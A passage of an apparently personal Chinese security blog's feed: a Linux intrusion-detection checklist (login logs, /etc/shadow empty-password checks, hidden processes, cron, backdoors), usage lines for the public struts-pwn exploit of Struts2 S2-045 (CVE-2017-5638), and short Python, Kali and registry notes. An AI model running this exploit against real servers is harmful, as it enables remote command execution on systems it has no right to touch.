    <content type="html"><![CDATA[<h1 id="审计命令"><a href="#审计命令" class="headerlink" title="审计命令"></a>审计命令</h1><h2 id="last"><a href="#last" class="headerlink" title="last"></a>last</h2><blockquote><p>这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。</p></blockquote><pre><code>相关参数：last -10（-n） 查看最近10条记录last -x reboot 查看重启的记录last -x shutdown 查看关机的记录last -d 查看登陆的记录last –help 命令帮助信息last -f wtmp 用last命令查看wtmp文件（直接打开无法查看）</code></pre><a id="more"></a><h2 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h2><blockquote><p>这个命令用于查看登录失败的情况，本质就是将/var/log/btmp文件格式化输出。</p></blockquote><pre><code>相关参数：lastb name（root） 查看root用户登陆失败记录lastb -10（-n） 查看最近10条登陆失败记录lastb –heplp 命令帮助信息</code></pre><h2 id="lastlog"><a href="#lastlog" class="headerlink" title="lastlog"></a>lastlog</h2><blockquote><p>这个命令用于查看用户上一次的登录情况，本质就是将/var/log/lastlog文件格式化输出。</p></blockquote><pre><code>相关参数：lastlog 所有用户上一次登陆记录lastlog -u username（root） root用户上一次登陆记录lastlog –help 命令帮助信息</code></pre><h2 id="who"><a href="#who" class="headerlink" title="who"></a>who</h2><blockquote><p>这个命令用户查看当前登录系统的情况，本质就是将/var/log/utmp文件格式化输出。主要用来查看当前用户名称，以及登陆的ip地址信息，w命令与who一样，会更详细一些。</p><h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p>查看历史命令记录，其实就是查看root/.bash_history文件内容，删除这个文件，记录就没了。</p></blockquote><pre><code>相关参数：history 查看所有历史记录history -10 查看最近10条记录history | grep “wget” 查看wget相关信息的记录history –help 命令帮助信息</code></pre><blockquote><p>history显示时间戳：</p></blockquote><p><code>export HISTTIMEFORMAT=&quot;%F %T</code>whoami<code>&quot;history | more</code></p><h1 id="检查用户"><a href="#检查用户" class="headerlink" title="检查用户"></a>检查用户</h1><blockquote><p>Linux不同的用户，有不同的操作权限，但是所有用户都会在/etc/passwd、/etc/shadow、/etc/group文件中记录。</p></blockquote><pre><code>less /etc/passwd　　查看是否有新增用户grep :0 /etc/passwd　　查看是否有特权用户（root权限用户）ls -l /etc/passwd　　查看passwd最后修改时间</code></pre><p><code>cawk -F: &#39;$3==0 {print $1}&#39; /etc/passwd　　查看是否存在特权用户</code></p><p><code>awk -F: &#39;length($2)==0 {print $1}&#39; /etc/shadow　　查看是否存在空口令用户</code></p><blockquote><p>注：linux设置空口令：<code>passwd -d username</code></p></blockquote><h1 id="检查进程"><a href="#检查进程" class="headerlink" title="检查进程"></a>检查进程</h1><blockquote><p>一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。</p></blockquote><h2 id="普通进程"><a href="#普通进程" class="headerlink" title="普通进程"></a>普通进程</h2><pre><code>ps -aux　　查看进程top查看进程lsof -p pid　　查看进程所打开的端口及文件lsof -c 进程名　　查看关联文件ps -aux | grep python | cut -d &apos; &apos; -f 2 | xargs kill   杀死python相关的进程</code></pre><blockquote><p>检查/etc/inetd.conf文件，输入：<code>cat /etc/inetd.conf | grep –v &quot;^#&quot;</code>，输出的信息就是你这台机器所开启的远程服务。</p></blockquote><h2 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h2><pre><code>ps -ef | awk &apos;{print}&apos; | sort -n | uniq &gt;1  ls /proc | sort -n |uniq &gt;2diff 1 2</code></pre><h1 id="检查文件"><a href="#检查文件" class="headerlink" title="检查文件"></a>检查文件</h1><blockquote><p>被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。</p></blockquote><pre><code>find / -uid 0 -print　　查找特权用户文件find / -size +10000k -print　　查找大于10000k的文件find / -name &quot;…&quot; -prin　　查找用户名为…的文件find / -name core -exec ls -l {} \;　　查找core文件，并列出详细信息md5sum -b filename　　查看文件的md5值rpm -qf /bin/ls　　检查文件的完整性（还有其它/bin目录下的文件）whereis 文件名　　查看文件路径ls -al 文件名　　查看文件创建时间du -sh  文件名   查看文件大小</code></pre><h1 id="检查网络"><a href="#检查网络" class="headerlink" title="检查网络"></a>检查网络</h1><blockquote><p>检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。</p></blockquote><pre><code>ip link | grep PROMISC　　正常网卡不应该存在promisc，如果存在可能有snifferlsof -inetstat -nap　　查看不正常端口arp -a　　查看arp记录是否正常ifconfig -a　　查看网卡设置</code></pre><h1 id="检查计划任务"><a href="#检查计划任务" class="headerlink" title="检查计划任务"></a>检查计划任务</h1><blockquote><p>当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。</p></blockquote><pre><code>crontab -u root -l　　查看root用户的计划任务cat /etc/crontabls -l /etc/cron.*　　查看cron文件是否变化的详细信息ls /var/spool/cron/</code></pre><h1 id="检查系统后门"><a href="#检查系统后门" class="headerlink" title="检查系统后门"></a>检查系统后门</h1><blockquote><p>可以使用工具，如：Conmodo、rkhunter等，当然也可以手工输入命令检查。</p></blockquote><pre><code>vim $HOME/.ssh/authorized_keys　　查看ssh永久链接文件lsmod　　检查内核模块chkconfig –list/systemctl list-units –type=service　　检查自启</code></pre><blockquote><p>查看著名的木门后门程序：</p></blockquote><pre><code>ls /etc/rc.d   #系统开机后，此目录下的文件会被启动ls /etc/rc3.dfind / -name “.rhosts” –printfind / -name “.forward” –print</code></pre><h1 id="打包文件"><a href="#打包文件" class="headerlink" title="打包文件"></a>打包文件</h1><blockquote><p>当我们做好一切入侵检测分析后，我们需要把一些日志文件copy到本地进行更进一步详细的分析时，怎么打包服务器相关信息，并且copy到本地呢？</p></blockquote><h2 id="打包web文件"><a href="#打包web文件" class="headerlink" title="打包web文件"></a>打包web文件</h2><p>打包文件名中包含jsp的文件，打包后的文件为my_txt_files.tar：<br>tar cvf my_txt_files.tar <code>find . -type f -name &quot;*.jsp*&quot;</code></p><h2 id="打包日志文件"><a href="#打包日志文件" class="headerlink" title="打包日志文件"></a>打包日志文件</h2><pre><code>tar -cvf log.tar /var/log</code></pre><h2 id="打包其他信息"><a href="#打包其他信息" class="headerlink" title="打包其他信息"></a>打包其他信息</h2><pre><code>last &gt; last.lognetstat -an &gt; netstat.log</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;审计命令&quot;&gt;&lt;a href=&quot;#审计命令&quot; class=&quot;headerlink&quot; title=&quot;审计命令&quot;&gt;&lt;/a&gt;审计命令&lt;/h1&gt;&lt;h2 id=&quot;last&quot;&gt;&lt;a href=&quot;#last&quot; class=&quot;headerlink&quot; title=&quot;last&quot;&gt;&lt;/a&gt;last&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;相关参数：

last -10（-n） 查看最近10条记录
last -x reboot 查看重启的记录
last -x shutdown 查看关机的记录
last -d 查看登陆的记录
last –help 命令帮助信息
last -f wtmp 用last命令查看wtmp文件（直接打开无法查看）
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="linux" scheme="https://10o0.github.io/tags/linux/"/>
    
      <category term="入侵检测，安全审计" scheme="https://10o0.github.io/tags/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>kali安装NVIDIA显卡驱动</title>
    <link href="https://10o0.github.io/2018/01/10/kali%E5%AE%89%E8%A3%85NVIDIA%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8/"/>
    <id>https://10o0.github.io/2018/01/10/kali安装NVIDIA显卡驱动/</id>
    <published>2018-01-10T01:32:48.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<p>安装参考链接<br><a href="https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop" target="_blank" rel="noopener">https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop</a><br>验证：<br><a href="https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux" target="_blank" rel="noopener">https://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;安装参考链接&lt;br&gt;&lt;a href=&quot;https://forums.kali.org/showthread.php?35748-TUTORIAL-Installing-official-NVIDIA-driver-in-Optimus-laptop&quot; target=&quot;_bl
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="kali" scheme="https://10o0.github.io/tags/kali/"/>
    
      <category term="NVIDIA" scheme="https://10o0.github.io/tags/NVIDIA/"/>
    
      <category term="驱动" scheme="https://10o0.github.io/tags/%E9%A9%B1%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>s2-045 exp CVE-2017-5638</title>
    <link href="https://10o0.github.io/2017/03/16/s2-045-exp-CVE-2017-5638/"/>
    <id>https://10o0.github.io/2017/03/16/s2-045-exp-CVE-2017-5638/</id>
    <published>2017-03-16T03:30:23.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<p>Usage:</p><p>Testing a single URL.</p><pre><code>python struts-pwn.py --url &apos;http://example.com/struts2-showcase/index.action&apos; -c &apos;id&apos;</code></pre><p>Testing a list of URLs.</p><pre><code>python struts-pwn.py --list &apos;urls.txt&apos; -c &apos;id&apos;</code></pre><p>Checking if the vulnerability exists against a single URL.</p><pre><code>python struts-pwn.py --check --url &apos;http://example.com/struts2-showcase/index.action&apos;</code></pre><p>Checking if the vulnerability exists against a list of URLs.</p><pre><code>python struts-pwn.py --check --list &apos;urls.txt&apos;</code></pre><p>Requirements</p><pre><code>Python2 or Python3requests</code></pre><p><a href="https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py" title="s2-045" target="_blank" rel="noopener">https://github.com/mazen160/struts-pwn/blob/master/struts-pwn.py</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Usage:&lt;/p&gt;
&lt;p&gt;Testing a single URL.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python struts-pwn.py --url &amp;apos;http://example.com/struts2-showcase/index.action&amp;apos
      
    
    </summary>
    
      <category term="exploit" scheme="https://10o0.github.io/categories/exploit/"/>
    
    
      <category term="s2-045" scheme="https://10o0.github.io/tags/s2-045/"/>
    
      <category term="exp" scheme="https://10o0.github.io/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>Python command</title>
    <link href="https://10o0.github.io/2017/03/06/Python-command/"/>
    <id>https://10o0.github.io/2017/03/06/Python-command/</id>
    <published>2017-03-06T08:02:34.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<p>python:</p><pre><code>py -2 hello.pypy -3 hello.py</code></pre><p>pip</p><pre><code>py -2 -m pip install XXXXpy -3 -m pip install XXXX</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;python:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;py -2 hello.py

py -3 hello.py
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;pip&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;py -2 -m pip install XXXX

py -3 -m pip install 
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="https://10o0.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>SimpleHTTPServer</title>
    <link href="https://10o0.github.io/2017/03/05/SimpleHTTPServer/"/>
    <id>https://10o0.github.io/2017/03/05/SimpleHTTPServer/</id>
    <published>2017-03-05T02:18:03.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<pre><code>python -m SimpleHTTPServer 8080 #端口可自定义</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;python -m SimpleHTTPServer 8080 #端口可自定义
&lt;/code&gt;&lt;/pre&gt;
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="command" scheme="https://10o0.github.io/tags/command/"/>
    
  </entry>
  
  <entry>
    <title>win10-Cmd here</title>
    <link href="https://10o0.github.io/2017/03/04/win10-Cmd-here/"/>
    <id>https://10o0.github.io/2017/03/04/win10-Cmd-here/</id>
    <published>2017-03-04T08:27:02.000Z</published>
    <updated>2018-07-26T07:38:15.240Z</updated>
    
    <content type="html"><![CDATA[<p>保存为reg格式导入注册表即可：</p><pre><code>Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here]@=&quot;Cmd Here&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd_here\command]@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt]@=&quot;Cmd Here&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Folder\shell\cmdPrompt\command]@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot; \&quot;cd %1\&quot;&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here]@=&quot;Cmd Here&quot;[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\cmd_here\command]@=&quot;\&quot;C:\\Windows\\System32\\cmd.exe\&quot;&quot;</code></pre><p><img src="http://i.imgur.com/wZijEcJ.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;保存为reg格式导入注册表即可：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\cmd
      
    
    </summary>
    
      <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="cmd" scheme="https://10o0.github.io/tags/cmd/"/>
    
  </entry>
  
</feed>
